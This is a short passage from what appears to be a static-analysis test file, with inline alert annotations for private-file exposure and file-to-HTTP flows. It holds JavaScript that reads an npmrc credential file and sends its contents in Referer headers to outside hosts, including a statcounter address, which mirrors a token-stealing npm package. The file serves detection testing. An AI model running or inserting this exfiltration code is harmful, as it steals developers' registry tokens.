    ...
    fs.open(npmrc, "r", function (error, fd) {
      ...
      fs.read(fd, buffer, 0, buffer.length, null, function (error, bytesRead, buffer) {
        ...
        https1.get({
          ...
          method: "GET",
          headers: { Referer: "http://1.a/" + content } // $ Alert TODO-MISSING: Alert[js/exposure-of-private-files] Alert[js/file-access-to-http] - passing stolen token in a  header
        }, () => { }) // $ TODO-SPURIOUS: Alert[js/file-access-to-http]
        https1.get({
          hostname: "c.statcounter.com",
          path: "/11760461/0/7b5b9d71/1/",
          method: "GET",
          headers: { Referer: "http://2.b/" + content } // $ Alert TODO-MISSING: Alert[js/exposure-of-private-files] Alert[js/file-access-to-http] - passing stolen token in a  header
        }, () => { }) // $ TODO-SPURIOUS: Alert[js/file-access-to-http]
      });
    });
  }
